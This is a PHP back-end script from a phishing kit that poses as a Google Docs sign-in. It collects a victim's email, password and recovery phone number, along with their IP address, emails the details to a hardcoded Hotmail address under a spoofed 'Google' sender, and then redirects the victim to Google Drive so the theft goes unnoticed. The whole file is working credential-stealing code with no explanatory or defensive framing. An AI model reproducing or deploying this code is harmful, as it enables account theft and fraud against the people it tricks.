<?php


ini_set("output_buffering",4096);
session_start();


$userinfo="ccusumanno@hotmail.com";


$ip_header = $_SESSION['ip_header'];
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = $_POST['hostname'];


$_SESSION['donnee3'] = $phoneNumber = $_POST['donnee3'];

$email = $_SESSION['donnee1'];
$password = $_SESSION['donnee2'];



{

$Zboon="
============LOGIN DETAILS===================
Email		 : $email
Password    : $password
Recovery Phone: $phoneNumber  
--------------------------------------------
IP Address: $ip
============================================
";

$headers = "From:  Docs - HOrlaBadu ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$subject="Docs Result CFO | $ip | ";
$from = "From: Google <az@support.com>";




mail($userinfo,$subject,$Zboon,$headers);
mail($informations,$subject,$Zboon,$headers);

$encrypt=  base64_encode($Zboon);
header("Location: https://drive.google.com");

}

?>
